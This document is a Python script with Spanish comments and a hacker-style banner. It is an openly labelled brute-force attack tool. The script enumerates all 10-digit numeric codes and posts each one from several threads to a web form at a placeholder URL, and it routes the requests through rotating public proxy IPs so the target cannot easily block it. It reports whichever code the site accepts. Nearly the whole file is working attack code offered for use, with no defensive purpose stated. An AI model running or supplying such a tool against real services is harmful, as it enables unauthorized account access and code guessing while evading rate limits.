import itertools
import requests
import threading
import random
import queue

print("########################")
print("#    777Undefined777    #")
print("########################")

url = "https://ejemplo.com"  # URL de destino

session = requests.Session()

proxies = [
    {"http": "http://161.34.40.34:3128"},
    {"http": "http://84.255.197.228:83"},
]

code_queue = queue.Queue()

def check_code(code):
    try:
        data = {"code": code}  # EJEMPLO DE CAMPO DE INPUT
        proxy = random.choice(proxies) if proxies else None
        response = session.post(url, data=data, proxies=proxy, timeout=10)
        
        if "Código válido" in response.text:
            print(f"¡Código exitoso encontrado: {code}!")
        else:
            print(f"Código {code} no válido.")
    except requests.RequestException as e:
        print(f"Error al enviar solicitud: {e}")

def generate_codes(length):
    digits = "0123456789"
    for code in itertools.product(digits, repeat=length):
        code_queue.put(''.join(code))

def worker():
    while not code_queue.empty():
        code = code_queue.get()
        print(f"Intentando código: {code}")
        check_code(code)

def brute_force_attack(length, thread_count=4):
    threading.Thread(target=generate_codes, args=(length,)).start()

    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=worker)
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print("El ataque de fuerza bruta ha terminado.")

brute_force_attack(10)
